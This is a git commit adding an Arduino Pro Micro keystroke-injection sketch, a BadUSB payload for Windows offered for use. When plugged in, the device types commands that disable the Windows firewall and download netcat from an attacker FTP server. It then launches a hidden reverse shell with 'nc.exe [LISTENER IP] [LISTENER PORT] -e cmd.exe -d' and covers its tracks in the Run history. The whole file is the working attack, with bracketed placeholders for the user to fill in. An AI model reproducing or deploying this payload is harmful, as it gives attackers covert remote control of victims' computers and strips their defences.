3b1e7de9dd51b7ab7dbd6dfe4ed0f7c00bec1f26
TheFrenchGuy <30523707+TheFrenchGuy@users.noreply.github.com>
2017-08-01 08:19:54 +0100

    Payload netcat FTP download and reverse shell
    This script will:
    
    create an FTP script that logs you in to the FTP server and download netcat
    
    delete the FTP script file
    
    run netcat in daemon mode
    
    run cmd.exe one more time to conceal the command we used in the run history.
    
    Fill in the required information where you see the brackets.

---
+++ Payload_netcat_FTP_download_and_reverse_shell_ArduinoProMicro/Payload_netcat_FTP_download_and_reverse_shell_ArduinoProMicro.ino
@@ -0,0 +1,128 @@
+/*
+ * Generated with <3 by Dckuino.js, an open source project !
+ */
+
+#include "Keyboard.h"
+
+void typeKey(int key)
+{
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+/* Init function */
+void setup()
+{
+  // Begining the Keyboard stream
+  Keyboard.begin();
+
+  // Wait 500ms
+  delay(500);
+
+  delay(10000);
+
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+
+  delay(200);
+
+  Keyboard.print("cmd");
+
+  typeKey(KEY_RETURN);
+
+  delay(600);
+
+  Keyboard.print("cd %USERPROFILE%");
+
+  typeKey(KEY_RETURN);
+
+  delay(100);
+
+  Keyboard.print("netsh firewall set opmode disable");
+
+  typeKey(KEY_RETURN);
+
+  delay(2000);
+
+  Keyboard.print("echo open [IP] [PORT] > ftp.txt");
+
+  typeKey(KEY_RETURN);
+
+  delay(100);
+
+  Keyboard.print("echo [USERNAME]>> ftp.txt");
+
+  typeKey(KEY_RETURN);
+
+  delay(100);
+
+  Keyboard.print("echo [PASSWORD]>> ftp.txt");
+
+  typeKey(KEY_RETURN);
+
+  delay(100);
+
+  Keyboard.print("echo bin >> ftp.txt");
+
+  typeKey(KEY_RETURN);
+
+  delay(100);
+
+  Keyboard.print("echo get nc.exe >> ftp.txt");
+
+  typeKey(KEY_RETURN);
+
+  delay(100);
+
+  Keyboard.print("echo bye >> ftp.txt");
+
+  typeKey(KEY_RETURN);
+
+  delay(100);
+
+  Keyboard.print("ftp -s:ftp.txt");
+
+  typeKey(KEY_RETURN);
+
+  Keyboard.print("del ftp.txt & exit");
+
+  typeKey(KEY_RETURN);
+
+  delay(2000);
+
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+
+  delay(200);
+
+  Keyboard.print("nc.exe [LISTENER IP] [LISTENER PORT] -e cmd.exe -d");
+
+  typeKey(KEY_RETURN);
+
+  delay(2000);
+
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+
+  delay(200);
+
+  Keyboard.print("cmd");
+
+  typeKey(KEY_RETURN);
+
+  delay(600);
+
+  Keyboard.print("exit");
+
+  typeKey(KEY_RETURN);
+
+  // Ending stream
+  Keyboard.end();
+}
+
+/* Unused endless loop */
+void loop() {}
